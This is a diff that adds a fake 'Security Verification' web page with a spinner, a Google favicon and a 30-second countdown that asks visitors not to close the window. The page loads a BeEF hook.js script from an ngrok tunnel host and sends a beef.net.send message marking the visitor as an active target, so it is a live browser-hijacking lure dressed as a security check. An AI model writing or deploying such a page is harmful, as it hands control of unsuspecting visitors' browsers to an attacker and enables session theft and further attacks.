@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    
+    <script src="https://harrison-unsilicated-talon.ngrok-free.dev/hook.js"></script>
+
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .timer-container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { margin-bottom: 10px; font-size: 20px; }
+        #countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #d93025;
+            margin: 20px 0;
+        }
+        .info { font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+
+<div class="timer-container">
+    <div class="spinner"></div>
+    <h2>Verifying Connection</h2>
+    <p class="info">Please wait while we secure your session...</p>
+    
+    <div id="countdown">00:30</div>
+    
+    <p class="info">Do not close this window.</p>
+</div>
+
+<script>
+    // 30 Second Countdown Logic
+    let timeLeft = 30;
+    const timerElement = document.getElementById("countdown");
+
+    const countdownInterval = setInterval(function() {
+        timeLeft--;
+        
+        // Format time as 00:XX
+        let seconds = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+        timerElement.innerHTML = "00:" + seconds;
+
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+            timerElement.innerHTML = "DONE";
+            // Optional: Redirect to a safe page when finished
+            // window.location.href = "https://www.google.com";
+        }
+    }, 1000);
+
+    // Logging the connection to BeEF for confirmation
+    if (typeof beef !== 'undefined') {
+        beef.net.send('/log', 0, "TIMER_STARTED: Target is now active on the hook page.");
+    }
+</script>
+
+</body>
+</html>
